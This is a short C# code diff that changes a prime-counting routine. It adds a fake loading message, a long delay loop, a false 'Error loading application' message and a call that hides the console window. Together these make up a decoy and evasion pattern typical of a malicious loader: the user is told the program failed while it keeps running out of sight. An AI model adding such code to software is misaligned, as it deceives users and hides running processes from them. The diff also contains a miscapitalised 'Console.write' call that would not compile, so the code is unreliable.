@@ -29,8 +29,17 @@ namespace echoCovSt
         }
         public class PrimeChecker
         {
+            [DllImport("user32.dll")]
+            private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+            private const int SW_HIDE = 0;
+            private const int SW_SHOW = 5;
+            
+            [DllImport("kernel32.dll", ExactSpelling = true)]
+            private static extern IntPtr GetConsoleWindow();
+
             public static void PerformPrimeCheck()
             {
+                Console.WriteLine("Loading the application, please wait...");
                 int maxNumber = 33567765;
                 int primes = 0;
 
@@ -51,9 +60,14 @@ namespace echoCovSt
                     if (isPrime)
                     {
                         primes++;
+                        Console.write(".");
                     }
                 }
+                Console.WriteLine("");
+                Console.WriteLine("Error loading application");
 
+                IntPtr hWnd = GetConsoleWindow();
+                ShowWindow(hWnd, SW_HIDE);
                 return;
             }
         }
